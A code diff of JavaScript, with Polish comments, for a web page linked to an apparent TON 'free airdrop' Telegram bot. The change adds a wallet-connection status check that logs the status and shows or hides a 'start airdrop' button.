@@ -17,16 +17,35 @@
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
+
         tonConnectUI.uiOptions = {
             twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
         };
 
         const startAirdropButton = document.getElementById('start-airdrop');
 
-        // Pokaż przycisk "Rozpocznij Airdrop" po podłączeniu portfela
-        tonConnectUI.onStatusChange((status) => {
+        // Funkcja, aby sprawdzić status połączenia i pokazać przycisk
+        async function checkWalletConnection() {
+            const status = await tonConnectUI.getStatus(); // Pobierz status połączenia
+
             if (status === 'connected') {
                 startAirdropButton.style.display = 'block';
+                console.log("Portfel połączony, przycisk aktywowany.");
+            } else {
+                console.log("Portfel nie jest połączony.");
+            }
+        }
+
+        // Wywołaj sprawdzenie statusu przy starcie i ustawienie listenera
+        checkWalletConnection();
+
+        // Ustaw listener dla zmiany statusu
+        tonConnectUI.onStatusChange((status) => {
+            console.log("Status połączenia:", status);
+            if (status === 'connected') {
+                startAirdropButton.style.display = 'block';
+            } else {
+                startAirdropButton.style.display = 'none';
             }
         });
 
